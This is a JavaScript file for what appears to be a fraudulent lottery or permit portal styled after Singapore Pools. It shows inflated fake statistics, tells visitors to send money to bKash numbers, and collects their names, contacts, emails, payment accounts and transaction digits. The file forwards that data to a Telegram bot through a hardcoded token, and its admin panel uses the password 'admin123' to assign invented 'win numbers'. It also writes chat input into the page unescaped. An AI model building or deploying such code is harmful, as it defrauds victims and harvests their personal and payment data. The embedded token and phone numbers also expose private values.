const firebaseConfig = {
    databaseURL: "https://singapore-portal-default-rtdb.firebaseio.com/"
};

if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

function showSection(sectionId) {
    const sections = ['home', 'guide', 'apply', 'status'];
    sections.forEach(id => {
        const el = document.getElementById(`section-${id}`);
        const navBtn = document.getElementById(`nav-${id}`);
        
        if (id === sectionId) {
            if(el) el.classList.remove('hidden');
            if (navBtn) navBtn.classList.add('active');
        } else {
            if(el) el.classList.add('hidden');
            if (navBtn) navBtn.classList.remove('active');
        }
    });
    window.scrollTo(0, 0);
}

document.addEventListener("DOMContentLoaded", function() {
    showSection('home'); 
    loadSettingsOnPage();
    loadLiveStats();
    changeLanguage('bn'); 
});

// লাইভ স্ট্যাটস রিয়েল-টাইম কাউন্টার আপডেট
function loadLiveStats() {
    db.ref('applications').on('value', (snapshot) => {
        const data = snapshot.val();
        let totalCount = 1420;
        let winnerCount = 850;
        if(data) {
            let keys = Object.keys(data);
            totalCount += keys.length;
            keys.forEach(k => {
                if(data[k].status === 'Approved') winnerCount++;
            });
        }
        let tEl = document.getElementById('totalAppStat');
        let wEl = document.getElementById('winnersStat');
        if(tEl) tEl.textContent = totalCount + "+";
        if(wEl) wEl.textContent = winnerCount + "+";
    });
}

function changeLanguage(lang) {
    const elements = document.querySelectorAll('[data-en]');
    elements.forEach(el => {
        const text = el.getAttribute(`data-${lang}`);
        if (text) {
            if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
                el.placeholder = text;
            } else {
                el.innerHTML = text;
            }
        }
    });
}

// গ্লোবাল পেমেন্ট নম্বর রিয়েল-টাইমে লোড করা
function loadSettingsOnPage() {
    try {
        db.ref('settings').on('value', (snapshot) => {
            const data = snapshot.val();
            let settings = data || { bikash: '01879774023', psb: '8461912' };
            let bEl = document.getElementById('displayBikash');
            let pEl = document.getElementById('displayPsb');
            if(bEl) bEl.textContent = settings.bikash;
            if(pEl) pEl.textContent = settings.psb;
        });
    } catch(e) {}
}

function copyToClipboard(elementId, btnElement) {
    const textToCopy = document.getElementById(elementId).textContent;
    navigator.clipboard.writeText(textToCopy).then(() => {
        let originalText = btnElement.innerHTML;
        let lang = document.getElementById('langSelector').value;
        btnElement.innerHTML = (lang === 'en') ? 'Copied!' : 'কপি হয়েছে!';
        btnElement.style.background = '#10b981';
        setTimeout(() => {
            btnElement.innerHTML = originalText;
            btnElement.style.background = '#e11d48';
        }, 2000);
    });
}

function toggleChatBox() {
    const chatBox = document.getElementById('liveChatBox');
    if(chatBox) chatBox.classList.toggle('hidden');
}

function handleChatKey(e) {
    if (e.key === 'Enter') sendChatMessage();
}

function sendChatMessage() {
    const input = document.getElementById('chatInput');
    if(!input || !input.value.trim()) return;
    const msg = input.value.trim();
    const chatBody = document.getElementById('chatBody');

    chatBody.innerHTML += `<div class="chat-msg user">${msg}</div>`;
    input.value = '';
    chatBody.scrollTop = chatBody.scrollHeight;

    setTimeout(() => {
        let lang = document.getElementById('langSelector').value;
        let replyText = (lang === 'en') ? 'For direct support message on WhatsApp: <a href="https://wa.me/66840502810" target="_blank" style="color:#25d366; font-weight:bold;">+66840502810</a>' : 'সরাসরি সহায়তার জন্য হোয়াটসঅ্যাপে মেসেজ করুন: <a href="https://wa.me/66840502810" target="_blank" style="color:#25d366; font-weight:bold;">+66840502810</a>';
        chatBody.innerHTML += `<div class="chat-msg bot">${replyText}</div>`;
        chatBody.scrollTop = chatBody.scrollHeight;
    }, 600);
}

// টেলিগ্রাম বটে নোটিফিকেশন পাঠানো
function sendTelegramNotification(appData) {
    const botToken = "8711729817:AAG2VUDDl3lmTCcPZGADEpMo3U_OeqcIJW8";
    const chatId = "7560607133";

    let textMessage = `🚨 *নতুন সিঙ্গাপুর পুলস আবেদন* 🚨\n\n` +
                      `🆔 *App ID:* \`${appData.appNo}\`\n` +
                      `👤 *Name:* ${appData.firstName} ${appData.lastName}\n` +
                      `📞 *Contact:* ${appData.contactNumber}\n` +
                      `📧 *Gmail:* ${appData.gmail}\n` +
                      `🏷 *Type:* ${appData.permitType}\n` +
                      `💳 *Sender Acc:* ${appData.senderAccount}\n` +
                      `🔢 *Last Digits:* ${appData.lastDigits}\n` +
                      `⚡ *Status:* ${appData.status}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: textMessage, parse_mode: 'Markdown' })
    }).catch(err => {});
}

// ফর্ম সাবমিট হ্যান্ডলার
function handleFormSubmit(e) {
    e.preventDefault();

    const submitBtn = document.getElementById('submitBtn');
    let lang = document.getElementById('langSelector').value;
    if(submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = (lang === 'en') ? 'Submitting...' : 'জমা দেওয়া হচ্ছে...';
    }

    const appNo = 'APP-' + Math.floor(1000 + Math.random() * 9000);
    
    const newApp = {
        appNo: appNo,
        firstName: document.getElementById('firstName').value.trim(),
        lastName: document.getElementById('lastName').value.trim(),
        contactNumber: document.getElementById('contactNumber').value.trim(),
        gmail: document.getElementById('gmail').value.trim(),
        permitType: document.getElementById('permitType').value,
        senderAccount: document.getElementById('senderAccount').value.trim(),
        lastDigits: document.getElementById('lastDigits').value.trim(),
        receiveMoneyInfo: document.getElementById('receiveMoneyInfo').value.trim() || 'N/A',
        status: 'Pending',
        winNumber: null
    };

    db.ref('applications/' + appNo).set(newApp, (error) => {
        if(submitBtn) {
            submitBtn.disabled = false;
            submitBtn.textContent = (lang === 'en') ? 'Submit Application' : 'আবেদন জমা দিন';
        }

        if(!error) {
            sendTelegramNotification(newApp);

            document.getElementById('generatedAppIdBox').textContent = appNo;
            document.getElementById('successModal').classList.remove('hidden');
            document.getElementById('applicationForm').reset();
        } else {
            alert(lang === 'en' ? 'Error submitting application. Try again.' : 'আবেদন জমা দিতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
        }
    });
}

function closeSuccessModal() {
    document.getElementById('successModal').classList.add('hidden');
    document.getElementById('checkAppNo').value = document.getElementById('generatedAppIdBox').textContent;
    showSection('status');
}

// স্ট্যাটাস চেক ফাংশন
function checkStatus() {
    const appNo = document.getElementById('checkAppNo').value.trim();
    const contact = document.getElementById('checkContact').value.trim();
    const resultDiv = document.getElementById('statusResult');
    let lang = document.getElementById('langSelector').value;

    if(!appNo || !contact) {
        alert(lang === 'en' ? 'Please enter both Application ID and Contact number.' : 'দয়া করে অ্যাপ্লিকেশন আইডি এবং কন্টাক্ট নম্বর উভয়ই লিখুন।');
        return;
    }

    db.ref('applications/' + appNo).once('value', (snapshot) => {
        const found = snapshot.val();
        resultDiv.classList.remove('hidden');

        if(found && found.contactNumber === contact) {
            let bgStyle = found.status === 'Approved' ? 'background: #dcfce7; color: #166534; border: 1px solid #bbf7d0;' : 
                          found.status === 'Rejected' ? 'background: #fee2e2; color: #991b1b; border: 1px solid #fecaca;' : 
                          'background: #fef9c3; color: #854d0e; border: 1px solid #fef08a;';
                
            let winSectionHTML = '';
            if(found.status === 'Approved') {
                winSectionHTML = `
                    <div style="margin-top: 15px; background: white; padding: 15px; border-radius: 8px; border: 1px solid #86efac; text-align: left;">
                        <h4 style="color: #15803d; margin-bottom: 5px;"><i class="fas fa-star"></i> ${lang === 'en' ? 'Application Approved!' : 'আবেদন অনুমোদিত হয়েছে!'}</h4>
                        <p style="font-size: 13px; color: #334155; margin-bottom: 8px;">${lang === 'en' ? 'Your Win Number:' : 'আপনার লটারি নম্বর:'} <strong style="color: #e11d48; font-size: 16px;">${found.winNumber}</strong></p>
                    </div>
                `;
            } else if(found.status === 'Rejected') {
                winSectionHTML = `<p style="margin-top: 10px; font-weight: bold; color: #dc2626;">${lang === 'en' ? '❌ Your application has been rejected by Admin.' : '❌ আপনার আবেদনটি অ্যাডমিন কর্তৃক বাতিল করা হয়েছে।'}</p>`;
            } else {
                winSectionHTML = `<p style="margin-top: 10px; font-weight: bold; color: #ca8a04;">${lang === 'en' ? '⏳ Status: Pending. Your application is under review.' : '⏳ স্ট্যাটাস: পেন্ডিং (Pending)। আপনার আবেদনটি যাচাই করা হচ্ছে।'}</p>`;
            }

            resultDiv.style = bgStyle + " padding: 15px; border-radius: 8px; margin-top: 15px;";
            resultDiv.innerHTML = `
                <strong>${lang === 'en' ? 'Application ID:' : 'অ্যাপ্লিকেশন আইডি:'} ${found.appNo}</strong><br>
                ${lang === 'en' ? 'Name:' : 'নাম:'} ${found.firstName} ${found.lastName}<br>
                ${lang === 'en' ? 'Permit Type:' : 'পারমিট টাইপ:'} ${found.permitType}<br>
                <div style="margin-top: 5px; font-weight: bold; text-transform: uppercase;">Status: ${found.status}</div>
                ${winSectionHTML}
            `;
        } else {
            resultDiv.style = "background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; padding: 15px; border-radius: 8px; margin-top: 15px;";
            resultDiv.innerHTML = `<strong>${lang === 'en' ? 'No application found with this info!' : 'এই তথ্যের সাথে কোনো আবেদন পাওয়া যায়নি! (ভুল তথ্য দিয়েছেন)'}</strong>`;
        }
    });
}

// পাসওয়ার্ড সুরক্ষিত অ্যাডমিন প্যানেল প্রম্পট
function promptAdminPassword() {
    let lang = document.getElementById('langSelector').value;
    const inputPwd = prompt(lang === 'en' ? "Enter Admin Password:" : "অ্যাডমিন পাসওয়ার্ড দিন:");
    if (inputPwd === "admin123") {
        document.getElementById('adminModal').classList.remove('hidden');
        loadAdminData();
        loadAdminSettingsToForm();
    } else if (inputPwd !== null) {
        alert(lang === 'en' ? "Wrong Password!" : "ভুল পাসওয়ার্ড!");
    }
}

function closeAdminModal() {
    document.getElementById('adminModal').classList.add('hidden');
}

function loadAdminSettingsToForm() {
    db.ref('settings').once('value', (snapshot) => {
        const settings = snapshot.val() || { bikash: '01879774023', psb: '8461912' };
        document.getElementById('adminBikashInput').value = settings.bikash;
        document.getElementById('adminPsbInput').value = settings.psb;
    });
}

// গ্লোবাল পেমেন্ট নম্বর আপডেট
function saveAdminSettings() {
    const bikashVal = document.getElementById('adminBikashInput').value.trim();
    const psbVal = document.getElementById('adminPsbInput').value.trim();
    let lang = document.getElementById('langSelector').value;

    if(!bikashVal || !psbVal) {
        alert(lang === 'en' ? "Please fill both numbers!" : "দুটি নম্বরই পূরণ করুন!");
        return;
    }

    const newSettings = { bikash: bikashVal, psb: psbVal };
    db.ref('settings').set(newSettings, (error) => {
        if(!error) {
            alert(lang === 'en' ? "Payment numbers updated successfully for all users!" : "পেমেন্ট নম্বর সকল ইউজারের জন্য সফলভাবে আপডেট হয়েছে!");
        } else {
            alert(lang === 'en' ? "Error updating settings!" : "আপডেট করতে সমস্যা হয়েছে!");
        }
    });
}

// সেন্ট্রাল অ্যাডমিন টেবিল লোড করা
function loadAdminData() {
    let container = document.getElementById('adminTableContainer');
    if(!container) return;

    db.ref('applications').once('value', (snapshot) => {
        const data = snapshot.val();
        if(!data) {
            container.innerHTML = `<p style="text-align:center; color:#64748b; padding:20px;">কোনো আবেদন জমা হয়নি।</p>`;
            return;
        }

        let html = `
            <table>
                <thead>
                    <tr>
                        <th>App & Type</th>
                        <th>Name & Contact</th>
                        <th>Acc / Trx</th>
                        <th>Win Number (Custom)</th>
                        <th>Status & Action</th>
                    </tr>
                </thead>
                <tbody>
        `;

        Object.keys(data).forEach((appNo) => {
            let app = data[appNo];
            let statusColor = app.status === 'Approved' ? 'color: #16a34a; font-weight:bold;' :
                              app.status === 'Rejected' ? 'color: #dc2626; font-weight:bold;' :
                              'color: #ca8a04; font-weight:bold;';

            let currentWinNum = app.winNumber || (app.permitType === 'TOTO' ? Math.floor(1000000 + Math.random() * 9000000) : Math.floor(1000 + Math.random() * 9000));

            html += `
                <tr>
                    <td><strong>${app.appNo}</strong><br><span style="color:#e11d48; font-weight:bold;">${app.permitType}</span></td>
                    <td>${app.firstName} ${app.lastName}<br><small>${app.contactNumber}</small></td>
                    <td>${app.senderAccount}<br><small style="color: #64748b;">(Trx: ${app.lastDigits})</small></td>
                    <td>
                        <input type="text" id="winInput_${app.appNo}" value="${currentWinNum}" style="width: 85px; padding: 4px; font-size: 11px; text-align: center; border: 1px solid #cbd5e1; border-radius: 4px;" placeholder="Win No">
                    </td>
                    <td>
                        <span style="${statusColor}">${app.status}</span><br>
                        <div style="margin-top: 4px; display: flex; gap: 3px;">
                            <button type="button" onclick="updateStatus('${app.appNo}', 'Approved')" style="background:#22c55e; color:white; border:none; padding:3px 6px; border-radius:3px; cursor:pointer; font-size:10px;">Approve</button>
                            <button type="button" onclick="updateStatus('${app.appNo}', 'Rejected')" style="background:#ef4444; color:white; border:none; padding:3px 6px; border-radius:3px; cursor:pointer; font-size:10px;">Reject</button>
                        </div>
                    </td>
                </tr>
            `;
        });

        html += `</tbody></table>`;
        container.innerHTML = html;
    });
}

// স্ট্যাটাস ও উইন নম্বর আপডেট
function updateStatus(appNo, newStatus) {
    db.ref('applications/' + appNo).once('value', (snapshot) => {
        let app = snapshot.val();
        if(app) {
            app.status = newStatus;
            if(newStatus === 'Approved') {
                const customWinInput = document.getElementById(`winInput_${appNo}`);
                app.winNumber = customWinInput ? customWinInput.value.trim() : (app.permitType === 'TOTO' ? Math.floor(1000000 + Math.random() * 9000000) : Math.floor(1000 + Math.random() * 9000));
            } else {
                app.winNumber = null;
            }

            db.ref('applications/' + appNo).set(app, (error) => {
                if(!error) {
                    loadAdminData();
                    alert(`আবেদন সফলভাবে ${newStatus === 'Approved' ? 'অনুমোদন ও উইন নম্বর সহ' : 'বাতিল'} করা হয়েছে!`);
                }
            });
        }
    });
}
